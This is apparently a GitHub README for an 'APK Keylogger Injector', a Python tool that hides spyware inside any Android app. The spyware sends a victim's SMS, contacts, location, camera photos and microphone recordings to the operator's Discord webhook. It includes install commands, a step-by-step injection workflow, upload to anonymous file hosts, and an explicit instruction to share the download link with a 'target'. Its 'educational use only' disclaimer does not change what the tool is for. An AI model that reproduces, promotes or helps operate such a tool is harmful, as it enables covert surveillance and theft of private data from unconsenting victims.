# 🔒 APK Keylogger Injector

> **⚠️ FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY**  
> This tool is designed to demonstrate security vulnerabilities in Android applications.  
> **Do not use on devices you do not own or without explicit permission.**  
> Misuse of this software is illegal and the developer assumes no responsibility.

---

## 📌 Overview

**APK Keylogger Injector** is a Python script that injects a custom keylogger service into any Android APK file.  
It runs entirely on your local device (Termux, Linux, or Windows) – **no cloud server required**.  
After injection, the modified APK is uploaded to a file-sharing service, and you receive a **download link** to share with your target.

The injected keylogger collects selected data (SMS, contacts, location, camera, audio) and sends it to your **Discord webhook** at a configurable interval.

---

## ✨ Features

- 📱 **Inject into any APK** – works with games, apps, system apps.
- 🎯 **Select data collection** – choose which permissions/data to collect:
  - SMS messages
  - Contacts
  - GPS location
  - Camera photos (front/back)
  - Audio recording (microphone)
- 🌐 **Discord webhook integration** – all stolen data is sent to your Discord server.
- ⏱️ **Configurable send interval** – set how often data is exfiltrated.
- 🔗 **Cloud upload** – the final APK is uploaded to `file.io`, `anonfiles`, or `gofile` and a direct **download link** is generated.
- 🖥️ **Runs locally** – no server, no Oracle, no hosting costs.
- 🛠️ **Full menu-driven UI** – easy to use with back buttons and clear prompts.
- 🔑 **Auto‑generated keystore** – the script creates a signing key for you.

---

## ⚠️ Legal & Ethical Disclaimer

**By using this software, you agree to the following:**

- You will **not** use this tool on devices you do not own or without written permission from the owner.
- You are solely responsible for any legal consequences arising from misuse.
- The developer (GT Security Team) provides this tool **for educational purposes only** to help understand Android security and penetration testing.

---

## 📦 Prerequisites

The script requires the following tools to be installed:

| Tool       | Purpose                 | Installation Command (Termux)          |
|------------|-------------------------|----------------------------------------|
| `python3`  | Run the script          | `pkg install python -y`                |
| `openjdk-17` | Java runtime for signing | `pkg install openjdk-17 -y`           |
| `apktool`  | Decode/rebuild APK      | `pkg install apktool -y`               |
| `zipalign` | APK alignment           | `pkg install zipalign -y`              |
| `aapt`     | Package info extraction | `pkg install aapt -y`                  |
| `requests` | Python HTTP library     | `pip install requests`                 |

> 💡 If you're running on **Linux (Debian/Ubuntu)**, use `apt` instead of `pkg`.

---

## 🚀 Installation

### 1. Clone the repository

```bash
git clone https://github.com/Malik506-dev/Apk-Keylogger-Injector.git
cd Apk-Keylogger-Injector
```

### 2. Install dependencies

```bash
# For Termux (Android)
pkg update -y
pkg install python openjdk-17 apktool zipalign aapt -y
pip install requests

# For Linux (Debian/Ubuntu)
sudo apt update
sudo apt install python3 openjdk-17-jdk apktool zipalign aapt -y
pip3 install requests
```

### 3. Make the script executable (optional)

```bash
chmod +x injector.py
```

---

## 🧪 Usage

Run the script:

```bash
python injector.py
```

### Main Menu

```
╔═══════════════════════════════════════════╗
║   APK KEYLOGGER BUILDER v2.0             ║
║   Local injection, cloud upload          ║
║   Discord webhook data exfiltration      ║
╚═══════════════════════════════════════════╝

[1] Inject Keylogger into APK
[2] About
[0] Exit
```

### Injection Process

1. Select `[1] Inject Keylogger into APK`.
2. Enter the **full path** to the original APK you want to modify.
3. Provide your **Discord webhook URL** (create one in your Discord server: Server Settings → Integrations → Webhooks).
4. Set the **data send interval** (default 30 seconds).
5. Choose which **features** to enable (SMS, Contacts, Location, Camera, Audio).
6. Confirm the configuration.
7. Wait for the injection to complete (2-5 minutes depending on APK size).
8. After successful injection, the script will upload the APK and display a **download link**.

---

## 📥 Output

- **Local APK:** Saved in `injected_apks/` folder.
- **Download Link:** A direct link to the modified APK (shared via file.io, anonfiles, or gofile).

Share the link with your target. When they install and open the APK (and grant permissions), the keylogger will start sending data to your Discord webhook.

---

## 🔧 Configuration Options

| Option           | Description                                                                 |
|------------------|-----------------------------------------------------------------------------|
| **APK Path**     | Full path to the original APK file.                                        |
| **Webhook URL**  | Your Discord webhook URL (must contain `discord.com`).                      |
| **Interval**     | How often (in seconds) the logger sends data to Discord.                    |
| **SMS**          | Collects SMS messages (requires READ_SMS permission).                       |
| **Contacts**     | Collects contacts (requires READ_CONTACTS permission).                      |
| **Location**     | Collects GPS location (requires ACCESS_FINE_LOCATION permission).           |
| **Camera**       | Captures a photo using the camera (requires CAMERA permission).             |
| **Audio**        | Records audio (requires RECORD_AUDIO permission).                           |

> ⚠️ The victim must grant the requested permissions for the logger to function.

---

## 📊 Data Sent to Discord

The logger sends a JSON payload containing:

```json
{
  "device": "Device model (e.g., SM-G998B)",
  "time": "2026-08-04 12:34:56",
  "sms": "SMS data (if enabled)",
  "contacts": "Contacts data (if enabled)",
  "location": "Latitude, Longitude (if enabled)",
  "camera": "Base64-encoded photo (if enabled)",
  "audio": "Base64-encoded audio (if enabled)"
}
```

> The actual Android implementation uses `Lorg/json/JSONObject` and sends via `HttpURLConnection`.

---

## 🛠️ Troubleshooting

| Issue                     | Solution                                                                                  |
|---------------------------|-------------------------------------------------------------------------------------------|
| `apktool: command not found` | Install apktool: `pkg install apktool -y` (Termux) or `sudo apt install apktool -y` (Linux). |
| `java: command not found`   | Install OpenJDK: `pkg install openjdk-17 -y` (Termux) or `sudo apt install openjdk-17-jdk -y`. |
| `zipalign not found`        | Install zipalign: `pkg install zipalign -y` (Termux) or from Android SDK.                |
| `aapt not found`            | Install aapt: `pkg install aapt -y` (Termux) or `sudo apt install aapt -y` (Linux).      |
| `ModuleNotFoundError: requests` | Install Python requests: `pip install requests`.                                        |
| **Injection fails**         | Make sure the APK is not corrupted and has sufficient space. Also check your internet connection for cloud upload. |
| **Upload fails**            | The script tries multiple services (file.io, anonfiles, gofile). If all fail, the APK is saved locally – you can share it manually. |

---

## 📝 License

This project is released under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

## 👨‍💻 Developer

**GT Security Team**  
- Discord: [Game Tube](https://discord.gg/nxHwdbXUmj)  
---

## ⭐ Contributing

Contributions are welcome! Feel free to open issues or pull requests for improvements, bug fixes, or new features.

---

## ❤️ Support

If you find this tool useful, please ⭐ star the repository and share it responsibly.

---

**Remember:** With great power comes great responsibility. **Use ethically.**
